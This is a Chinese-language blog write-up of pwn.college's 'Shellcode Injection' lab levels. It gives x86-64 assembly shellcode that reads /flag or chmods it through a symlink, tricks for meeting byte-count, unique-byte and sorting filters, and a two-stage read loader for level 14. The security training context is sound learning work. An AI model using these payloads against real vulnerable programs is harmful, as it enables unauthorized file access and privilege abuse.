+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>	<span class="hljs-keyword">nop</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">0x00000067616c662f</span>			# <span class="hljs-string">&quot;/flag&quot;</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">rbx</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsp</span>						# /flag<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span>							# read only<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">2</span>							# 系统调用号<br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, <span class="hljs-built_in">rax</span>                        # /flag的fd<br><br>    # <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">0x74756f2f706d742f</span>         # <span class="hljs-string">&quot;/tmp/out&quot;</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">0x00</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">0x74756f2f706d742f</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">rbx</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">01</span>|<span class="hljs-number">0100</span>                    # O_WRONLY|O_CREAT<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0777</span>                       # 权限<span class="hljs-number">777</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">2</span><br>    <span class="hljs-keyword">syscall</span><br><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rax</span>						# <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">r10</span>						# /flag的fd<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span>							# offset <span class="hljs-number">0</span>,从第一个字符开始打印<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, <span class="hljs-number">1000</span>						# 输出长度<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">40</span>							# 系统调用号<br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">60</span><br>    <span class="hljs-keyword">syscall</span><br><br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h4><p>限制在<code>0x12</code>个字节的shellcode，通过<code>chmod</code>系统调用，修改&#x2F;flag的权限即可。</p>
+<p>好神奇的软链接！</p>
+<blockquote>
+<p>linux下，软链接到一个程序时，修改这个软连接文件会导致原文件的权限也被修改。因此可以通过软链接来重命名一个a文件，0x61这样就能减少字节数。</p>
+</blockquote>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">0x61</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">4</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">0x5a</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h4><p>本来想通过<code>jmp [rip+10]</code>指令然后+nop填充来跳过int3的，但是这条指令就占了6个字节。后来发现jmp  标签只需要两个字节。更简单。</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">0x61</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">4</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">jmp</span> next<br><span class="hljs-meta">    .rept</span> <span class="hljs-number">0xa</span><br>    <span class="hljs-keyword">nop</span><br><span class="hljs-meta">    .endr</span><br><span class="hljs-symbol">next:</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">0x5a</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">60</span>					# sys_exit<br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">syscall</span><br><br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h4><p>它的过滤器如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">uint64_t</span> *input = shellcode_mem;<br><span class="hljs-type">int</span> sort_max = shellcode_size / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>) - <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; sort_max; i++)<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; sort_max-i<span class="hljs-number">-1</span>; j++)<br>        <span class="hljs-keyword">if</span> (input[j] &gt; input[j+<span class="hljs-number">1</span>])<br>        &#123;<br>            <span class="hljs-type">uint64_t</span> x = input[j];<br>            <span class="hljs-type">uint64_t</span> y = input[j+<span class="hljs-number">1</span>];<br>            input[j] = y;<br>            input[j+<span class="hljs-number">1</span>] = x;<br>        &#125;<br></code></pre></td></tr></table></figure>
+
+<p>而我的shellcode只有13个字节，13&#x2F;8 &#x3D; 1。再减1就是0。那么就不会执行过滤器。所以我执行后就拿到了flag。它实际会将16个字节以上的shellcode进行排序。</p>
+<h4 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h4><p>这道题是level10 加上删去读取stdin。可是使用chmod修改权限的shellcode压根就不需要stdin。网友还是厉害，想到了<code>chmod</code>这个方法。后面的几关都直接过了。</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">0x61</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">4</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">0x5a</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">syscall</span><br>    <br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h4><p>This challenge requires that every byte in your shellcode is unique!</p>
+<p>这一关需要每个字节是第一次使用，也就是没有重复的字节出现。</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">0x61</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">bl</span>, <span class="hljs-number">0x4</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">esi</span>, <span class="hljs-built_in">ebx</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">0x5a</span><br>    <span class="hljs-keyword">syscall</span><br><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>我居然一直不知道esi寄存器的存在，我以为只有a,b,c,d寄存器会有32位，16位，8位寄存器。</p>
+<p>通用寄存器都有低至16位的寄存器。</p>
+</blockquote>
+<h4 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h4><p>限制shellcode为0xc个字节！上面的exp还能删减一下。</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">0x61</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">esi</span>, <span class="hljs-number">0x4</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">0x5a</span><br>    <span class="hljs-keyword">syscall</span><br><br></code></pre></td></tr></table></figure>
+
+<p>这样就正好是0xc个字节。</p>
+<h4 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h4><p>shellcode只能是6个字节，我靠。看看人家的wp做吧，没有什么思路。</p>
+<p>发现得用当时的一些寄存器来达成目标。在调用我们的shellcode时，可以看到rax是0。并且</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"> <span class="hljs-built_in">RAX</span>  <span class="hljs-number">0x0</span><br> <span class="hljs-built_in">RBX</span>  <span class="hljs-number">0x627f8b68e7e0</span> (__libc_csu_init) ◂— endbr64 <br> <span class="hljs-built_in">RCX</span>  <span class="hljs-number">0x766dd2e1e297</span> (write+<span class="hljs-number">23</span>) ◂— <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">rax</span>, -<span class="hljs-number">01000h</span> /* <span class="hljs-string">&#x27;H=&#x27;</span> */<br> <span class="hljs-built_in">RDX</span>  <span class="hljs-number">0x26a69000</span> ◂— <span class="hljs-keyword">push</span> <span class="hljs-number">61h</span> /* <span class="hljs-number">0x83e78948616a</span> */<br> <span class="hljs-built_in">RDI</span>  <span class="hljs-number">0x766dd2efe7e0</span> (_IO_stdfile_1_lock) ◂— <span class="hljs-number">0x0</span><br> <span class="hljs-built_in">RSI</span>  <span class="hljs-number">0x766dd2efd723</span> (_IO_2_1_stdout_+<span class="hljs-number">131</span>) ◂— <span class="hljs-number">0xefe7e0000000000a</span> /* <span class="hljs-string">&#x27;\n&#x27;</span> */<br> <span class="hljs-built_in">R8</span>   <span class="hljs-number">0x16</span><br> <span class="hljs-built_in">R9</span>   <span class="hljs-number">0x10</span><br> <span class="hljs-built_in">R10</span>  <span class="hljs-number">0x627f8b68f113</span> ◂— <span class="hljs-number">0x525245000000000a</span> /* <span class="hljs-string">&#x27;\n&#x27;</span> */<br> <span class="hljs-built_in">R11</span>  <span class="hljs-number">0x246</span><br> <span class="hljs-built_in">R12</span>  <span class="hljs-number">0x627f8b68e200</span> (_start) ◂— endbr64 <br> <span class="hljs-built_in">R13</span>  <span class="hljs-number">0x7ffe2e2e5a80</span> ◂— <span class="hljs-number">0x1</span><br> <span class="hljs-built_in">R14</span>  <span class="hljs-number">0x0</span><br> <span class="hljs-built_in">R15</span>  <span class="hljs-number">0x0</span><br> <span class="hljs-built_in">RBP</span>  <span class="hljs-number">0x7ffe2e2e5990</span> ◂— <span class="hljs-number">0x0</span><br>*<span class="hljs-built_in">RSP</span>  <span class="hljs-number">0x7ffe2e2e5948</span> —▸ <span class="hljs-number">0x627f8b68e7c3</span> (main+<span class="hljs-number">636</span>) ◂— <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rip</span> + <span class="hljs-number">0cdah</span>]<br>*<span class="hljs-built_in">RIP</span>  <span class="hljs-number">0x26a69000</span> ◂— <span class="hljs-keyword">push</span> <span class="hljs-number">61h</span> /* <span class="hljs-number">0x83e78948616a</span> */<br></code></pre></td></tr></table></figure>
+
+<p>rax为0，那么就是read系统调用号。read系统调用的第一个参数rdi为文件描述符，需要为0。第二个参数rsi为读取存放的地址，这里应该就是rdx&#x2F;rdi都行。第三个参数rdx为0x26a6900为写入的字节数。</p>
+<p>那么也就是需要重写rdi寄存器和rsi寄存器即可。stageone的代码：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">edi</span>, <span class="hljs-built_in">edi</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">esi</span>, <span class="hljs-built_in">edx</span><br>    <span class="hljs-keyword">syscall</span><br><br></code></pre></td></tr></table></figure>
+
+<p>随后，把stagetwo的代码读入即可。</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-meta">    .rept</span> <span class="hljs-number">0x10</span><br>    <span class="hljs-keyword">nop</span><br><span class="hljs-meta">    .endr</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">0x61</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">esi</span>, <span class="hljs-number">0x4</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">0x5a</span><br>    <span class="hljs-keyword">syscall</span><br><br></code></pre></td></tr></table></figure>
+
+<p>需要一个填充，因为前六个字节也被覆盖了，因此执行只能从第七个字节开始。</p>
+<p>最后的命令是<code>cat stageone-raw shellcode-raw | /challenge/babyshell_level14</code>。抽象的是，我在gdb里调试了半天，stageone的代码一直无法进行系统调用，我以为是代码的问题，实际上是权限不够，无法进行syscall。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Pwn/" class="category-chain-item">Pwn</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Pwn/" class="print-no-link">#Pwn</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>pwn.college: Shellcode Injection</div>
+      <div>https://loboq1ng.github.io/2025/02/25/pwn-college-Shellcode-Injection/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Lobo Q1ng</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年2月25日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/03/05/Fuzzilli%EF%BC%9A%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/" title="Fuzzilli:论文阅读">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Fuzzilli:论文阅读</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/02/24/pwn-college-SQL-Playground/" title="pwn.college: SQL Playground">
+                        <span class="hidden-mobile">pwn.college: SQL Playground</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
